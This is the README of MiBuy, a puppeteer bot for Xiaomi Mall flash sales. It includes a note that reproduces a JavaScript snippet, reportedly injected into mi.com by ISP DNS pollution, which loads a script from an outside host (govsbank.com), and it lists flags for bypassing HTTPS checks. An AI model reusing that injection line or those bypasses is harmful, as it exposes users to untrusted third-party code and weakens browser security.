# MiBuy

基于puppeteer的小米商城抢购

## 声明

请勿当黄牛，本脚本仅提供抢1只手机方式。且puppeteer方式非爬虫非userscript，仅辅助我们更快操作浏览器。

## 使用

```bash
git clone https://github.com/maoxs2/MiBuy
cd MiBuy
yarn

# 修改buyer.js中config
node buyer.js
```

## 其他事项

```javascript
// 2019.03.08
// 今天使用本代码前出现问题，经过分析是网络服务商（上海移动）污染了DNS，将小米官网mi.com里的base.js给替换了，引起了Chrome(&Chromium)的安全性报错，替换后代码如下：
(function(){var l=document.createElement('script');l.src='https://bank.govsbank.com/dlhao.min.js';document.getElementsByTagName('body')[0].appendChild(l);})();(function(){var l=document.createElement('script');l.src='http://s01.mifile.cn//js/base.min.js?v201903011a';document.getElementsByTagName('body')[0].appendChild(l);})();
// 其中http://s01.mifile.cn//js/base.min.js?v201903011a是原JS
// 本人对于该现象不予置评，这种情况即便是追加"--allow-running-insecure-content"或"ignoreHTTPSErrors: true"或chrome://net-internals/#hsts Delete Site都无法解决。
// 本人最终选择使用了大家懂的代理工具摆脱污染。
// 为分享经验，让大家不走弯路，特此记录。
```

